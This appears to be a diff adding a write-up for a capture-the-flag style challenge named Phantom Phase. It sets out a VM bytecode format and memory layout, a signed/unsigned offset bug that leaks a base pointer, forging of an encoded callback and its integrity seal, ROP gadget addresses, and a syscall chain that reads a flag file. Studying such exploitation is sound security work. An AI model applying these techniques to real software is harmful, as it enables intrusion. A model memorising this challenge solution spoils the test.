@@ -1,0 +1,79 @@
+Phantom Phase static-analysis reference
+=======================================
+
+DRV1 container
+--------------
+Outer frame:  u32le blob_length || blob
+Blob header:  "DRV1" || u16le instruction_count || u16le data_length || u32le 0
+Instruction:  opcode:u8 dst:u8 src:u8 flags:u8 imm:u16le aux:u16le
+Limits:       1..512 instructions, at most 0x800 initialized data bytes
+
+Allocation and guest-memory layout
+----------------------------------
+real_base + 0x000  encoded phase-0 callback
+real_base + 0x008  encoded phase-1 callback
+real_base + 0x010  encoded phase-2 callback
+real_base + 0x018  encoded phase-3 callback
+real_base + 0x020  vector integrity seal
+real_base + 0x028  per-process vector key
+real_base + 0x700  guest-memory base pointer (initially real_base+0x900)
+real_base + 0x900  guest offset 0x000 / initialized data
+real_base + 0xd00  preselected native ROP-stack address
+real_base + 0xe80  pathname used by the final ROP chain
+real_base + 0xf00  file-output buffer
+
+Signed/unsigned memory-offset mismatch
+--------------------------------------
+Validation accepts a raw 12-bit memory immediate through 0xff8.
+Execution sign-extends the same 12-bit value before address calculation.
+
+    imm 0xe00 -> sign_extend_12(0xe00) = -0x200
+
+Therefore LOADQ at 0xe00 reads:
+
+    (real_base + 0x900) - 0x200 = real_base + 0x700
+
+That qword is the guest-memory base pointer itself. Subtracting 0x900 from
+its value recovers real_base. STOREQ at 0xe00 can then replace the pointer
+with real_base, exposing the callback table to ordinary guest offsets.
+
+Callback encoding and seal
+--------------------------
+For phase i in [0,3]:
+
+    vector[i] = rol64(callback[i] XOR key, 17+i)
+    callback[i] = ror64(vector[i], 17+i) XOR key
+
+The dispatcher validates:
+
+    seal = rol64(vector[1], 7)
+         XOR rol64(vector[3], 21)
+         XOR vector[0]
+         XOR rol64(vector[2], 14)
+         XOR 0x4452564d5345414c
+
+When only vector[0] changes, the repaired seal is:
+
+    new_seal = old_seal XOR old_vector0 XOR new_vector0
+
+Useful PIE-relative targets
+---------------------------
+0x1750  mov rsp, qword [rdi+0x10]; ret
+0x1760  pop rax; ret
+0x1770  pop rdi; ret
+0x1780  pop rsi; ret
+0x1790  pop rdx; ret
+0x17a0  xchg rax, rdi; ret
+0x17b0  syscall; ret
+0x17c0  normal phase-0 callback (course accepted)
+
+At callback dispatch, rdi points to the native VM context. The context field
+at rdi+0x10 is initialized to real_base+0xd00. Encoding PIE+0x1750 as the new
+phase-0 callback makes HALT pivot directly into a ROP chain assembled there.
+
+Final syscall chain
+-------------------
+openat(AT_FDCWD, "/run/flag.txt", O_RDONLY, 0)
+read(fd, real_base+0xf00, 0x100)
+write(1, real_base+0xf00, 0x100)
+exit(0)
